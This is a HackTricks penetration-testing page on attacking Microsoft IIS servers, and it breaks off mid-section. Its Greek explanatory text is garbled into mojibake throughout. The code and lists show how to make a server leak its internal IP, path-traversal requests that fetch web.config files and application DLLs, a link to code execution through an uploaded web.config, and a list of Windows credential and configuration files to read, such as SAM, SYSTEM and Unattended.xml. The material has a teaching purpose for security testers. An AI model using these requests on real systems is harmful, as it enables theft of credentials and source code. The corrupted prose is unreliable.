# IIS - Î”Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ­Ï‚ Î¥Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î¹Ï‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Ï‰Î½ Î´Î¿ÎºÎ¹Î¼Î±ÏƒÏ„Î¹ÎºÏÎ½:

* asp
* aspx
* config
* php

## Î‘Ï€Î¿ÎºÎ¬Î»Ï…ÏˆÎ· Î•ÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ®Ï‚ Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ IP

Î£Îµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® IIS ÏŒÏ€Î¿Ï… Î»Î±Î¼Î²Î¬Î½ÎµÏ„Îµ Î­Î½Î±Î½ ÎºÏ‰Î´Î¹ÎºÏŒ 302, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± Host ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ HTTP/1.0 ÎºÎ±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Î· ÎºÎµÏ†Î±Î»Î¯Î´Î± Location Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÎ¹ ÏƒÏ„Î·Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Î‘Ï€ÏŒÎºÏÎ¹ÏƒÎ· Ï€Î¿Ï… Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Ï„Î·Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® IP:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½ .config

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± .config ÎºÎ±Î¹ Î½Î± Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ±. ÎˆÎ½Î±Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± ÏƒÏ‡ÏŒÎ»Î¹Î¿ HTML: [ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ´Ï](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎºÎ±Î¹ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ [ÎµÎ´Ï](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î· Î»Î¯ÏƒÏ„Î± Ï€Î¿Ï… Î­Ï‡Ï‰ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ ÏƒÏ…Î³Ï‡Ï‰Î½ÎµÏÎ¿Î½Ï„Î±Ï‚ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Ï„Ï‰Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î»Î¹ÏƒÏ„ÏÎ½:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ ÎºÎ±Î¼Î¯Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·, Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Ï„Î·Î½ Ï‡ÏÎµÎ¹Î¬Î¶Î¿Î½Ï„Î±Î¹ Ï„Î·Î½ Î­Ï‡Î¿Ï…Î½ Î®Î´Î·.

## Î Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ· Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚

### Î”Î¹Î±ÏÏÎ¿Î® ÎºÏÎ´Î¹ÎºÎ± Ï€Î·Î³Î®Ï‚

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï€Î»Î®ÏÎ· Î±Î½Î¬Î»Ï…ÏƒÎ· ÏƒÏ„Î¿: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Î©Ï‚ ÏƒÏ…Î½Î¿Ï€Ï„Î¹ÎºÎ® Ï€ÎµÏÎ¯Î»Î·ÏˆÎ·, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±ÏÎºÎµÏ„Î¬ Î±ÏÏ‡ÎµÎ¯Î± web.config Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Ï…Ï‚ Ï†Î±ÎºÎ­Î»Î¿Ï…Ï‚ Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Î¼Îµ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚ ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î± "**assemblyIdentity**" ÎºÎ±Î¹ "**namespaces**". ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ **Ï€Î¿Ï Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ Ï„Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î±** ÎºÎ±Î¹ Î½Î± Ï„Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ.\
Î‘Ï€ÏŒ Ï„Î± **ÎºÎ±Ï„ÎµÎ²Î±ÏƒÎ¼Î­Î½Î± Dlls** ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ **Î½Î­Î± namespaces** ÏŒÏ€Î¿Ï… Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎºÎ±Î¹ Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ web.config Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î½Î­Î± namespaces ÎºÎ±Î¹ assemblyIdentity.\
Î•Ï€Î¯ÏƒÎ·Ï‚, Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± **connectionstrings.config** ÎºÎ±Î¹ **global.asax** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.\

{% endhint %}

Î£Ï„Î¹Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ **.Net MVC**, Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **web.config** Ï€Î±Î¯Î¶ÎµÎ¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ ÏÏŒÎ»Î¿ ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ ÎºÎ¬Î¸Îµ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ ÎµÏ„Î¹ÎºÎµÏ„ÏÎ½ XML "**assemblyIdentity**". 

### **Î•Î¾ÎµÏÎµÏÎ½Î·ÏƒÎ· Î´Ï…Î±Î´Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½**

ÎˆÎ½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **web.config** Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚, ÏŒÏ€Ï‰Ï‚:

- ÎˆÎºÎ´Î¿ÏƒÎ· **EntityFramework**
- **AppSettings** Î³Î¹Î± Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚, ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· Ï€ÎµÎ»Î¬Ï„Î· ÎºÎ±Î¹ JavaScript
- Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ **System.web** Î³Î¹Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ±Î¹ Ï‡ÏÏŒÎ½Î¿ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚
- Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ **System.webServer** Î³Î¹Î± Ï„Î± modules
- Î”Î­ÏƒÎ¼ÎµÏ…ÏƒÎ· ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ **Runtime** Î³Î¹Î± Ï€Î¿Î»Î»Î­Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÏŒÏ€Ï‰Ï‚ **Microsoft.Owin**, **Newtonsoft.Json** ÎºÎ±Î¹ **System.Web.Mvc**

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï…Ï€Î¿Î´Î·Î»ÏÎ½Î¿Ï…Î½ ÏŒÏ„Î¹ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î±, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **/bin/WebGrease.dll**, Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /bin Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.

### **Î‘ÏÏ‡ÎµÎ¯Î± Î¡Î¯Î¶Î±Ï‚ ÎšÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…**

Î¤Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ ÏÎ¹Î¶Î¹ÎºÏŒ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **/global.asax** ÎºÎ±Î¹ Ï„Î¿ **/connectionstrings.config** (Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚), ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± Î³Î¹Î± Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· ÎºÎ±Î¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.

### **ÎŸÎ½ÏŒÎ¼Î±Ï„Î± Î§ÏÏÏ‰Î½ ÎŸÎ½Î¿Î¼Î¬Ï„Ï‰Î½ ÎºÎ±Î¹ Web.Config**

ÎŸÎ¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ MVC Î¿ÏÎ¯Î¶Î¿Ï…Î½ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ **Î±ÏÏ‡ÎµÎ¯Î± web.config** Î³Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÏÎ¿Ï…Ï‚ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½, Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸Î¿ÏÎ½ ÎµÏ€Î±Î½Î±Î»Î±Î¼Î²Î±Î½ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ ÏƒÎµ ÎºÎ¬Î¸Îµ Î±ÏÏ‡ÎµÎ¯Î¿, ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î³Î¹Î± Î»Î®ÏˆÎ· ÎµÎ½ÏŒÏ‚ Î¬Î»Î»Î¿Ï… **web.config**.
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Î›Î®ÏˆÎ· DLLs**

Î— Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÎµ Î­Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ namespace Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ Ï„Î·Î½ ÏÏ€Î±ÏÎ¾Î· ÎµÎ½ÏŒÏ‚ DLL Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± "**WebApplication1**" ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ /bin. Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î³Î¹Î± Î»Î®ÏˆÎ· Ï„Î¿Ï… **WebApplication1.dll**:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Î‘Ï…Ï„ÏŒ Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ Ï„Î·Î½ ÏÏ€Î±ÏÎ¾Î· Î¬Î»Î»Ï‰Î½ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Ï‰Î½ DLLs, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **System.Web.Mvc.dll** ÎºÎ±Î¹ Ï„Î¿ **System.Web.Optimization.dll**, ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /bin.

Î£Îµ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÏŒÏ€Î¿Ï… Î­Î½Î± DLL ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î­Î½Î± namespace Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± **WebApplication1.Areas.Minded**, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¬Î½ÎµÎ¹ Ï„Î·Î½ ÏÏ€Î±ÏÎ¾Î· Î¬Î»Î»Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ web.config ÏƒÎµ Ï€ÏÎ¿Î²Î»Î­ÏˆÎ¹Î¼ÎµÏ‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚, ÏŒÏ€Ï‰Ï‚ **/area-name/Views/**, Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚ ÏƒÎµ Î¬Î»Î»Î± DLLs ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /bin. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ **/Minded/Views/web.config** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ namespaces Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Ï…Î½ Ï„Î·Î½ ÏÏ€Î±ÏÎ¾Î· ÎµÎ½ÏŒÏ‚ Î¬Î»Î»Î¿Ï… DLL, Ï„Î¿Ï… **WebApplication1.AdditionalFeatures.dll**.

### ÎšÎ¿Î¹Î½Î¬ Î±ÏÏ‡ÎµÎ¯Î±

Î‘Ï€ÏŒ [ÎµÎ´Ï](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 Î£Ï†Î¬Î»Î¼Î± 404

Î•Î¬Î½ Î²Î»Î­Ï€ÎµÏ„Îµ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:

